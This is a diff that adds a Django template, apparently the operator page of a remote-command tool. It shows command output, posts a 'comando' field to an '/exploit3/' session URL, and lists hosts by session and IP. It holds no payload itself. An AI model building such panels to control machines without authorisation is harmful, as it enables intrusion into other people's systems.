@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ {% include "cabeca.html" %}
+
+<style>
+
+</style>
+</head>
+<body style="background: #D3D3D3;">
+
+<textarea class="form-control" disabled >{{ saida }}</textarea>
+   <form action ="/exploit3/{{ sessao }}" method="POST">{% csrf_token %}
+
+<input name="comando" class="form-control">
+<button type="/exploit3/{{ sessao }}">Salvar</button>
+    </form>
+{% for a in hosts %}
+
+{{ a.sessao }}: {{ a.ip }}
+<p></p>
+
+{% endfor %}
+
+</body>
+</html>
